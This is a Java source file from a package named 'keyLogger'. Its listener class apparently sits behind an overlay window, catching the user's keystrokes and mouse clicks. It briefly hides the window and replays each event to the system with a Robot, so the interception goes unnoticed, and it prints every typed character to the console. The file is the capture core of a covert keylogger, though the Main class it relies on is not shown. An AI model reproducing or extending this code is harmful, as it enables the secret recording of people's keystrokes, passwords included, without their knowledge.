package keyLogger;

import java.awt.event.KeyEvent;
import java.awt.event.KeyListener;
import java.awt.event.MouseEvent;
import java.awt.event.MouseListener;

public class GenericListener implements KeyListener, MouseListener {

	@Override
	public void keyPressed(KeyEvent arg0) {
		Main.frame.setVisible(false);
		Main.r.keyPress(arg0.getKeyCode());
		Main.frame.setVisible(true);
	}

	@Override
	public void keyReleased(KeyEvent arg0) {
		Main.frame.setVisible(false);
		Main.r.keyRelease(arg0.getKeyCode());
		Main.frame.setVisible(true);
	}

	@Override
	public void keyTyped(KeyEvent arg0) {
		System.out.print(arg0.getKeyChar());
	}

	@Override
	public void mouseClicked(MouseEvent arg0) {
		Main.frame.setVisible(false);
		sleep();
		Main.r.mousePress(getMaskFromId(arg0.getButton()));
		sleep();
		Main.r.mouseRelease(getMaskFromId(arg0.getButton()));
		sleep();
		Main.frame.setVisible(true);
	}

	@Override
	public void mouseEntered(MouseEvent arg0) {
	}

	@Override
	public void mouseExited(MouseEvent arg0) {
	}

	@Override
	public void mousePressed(MouseEvent arg0) {
	}

	@Override
	public void mouseReleased(MouseEvent arg0) {
	}

	private void sleep() {
		try {
			Thread.sleep(10);
		} catch (InterruptedException e) {
			e.printStackTrace();
		}
	}

	private int getMaskFromId(int b) {
		switch (b) {
		case 1:
			return MouseEvent.BUTTON1_MASK;
		case 2:
			return MouseEvent.BUTTON2_MASK;
		case 3:
			return MouseEvent.BUTTON3_MASK;
		}
		return MouseEvent.NOBUTTON;
	}
}
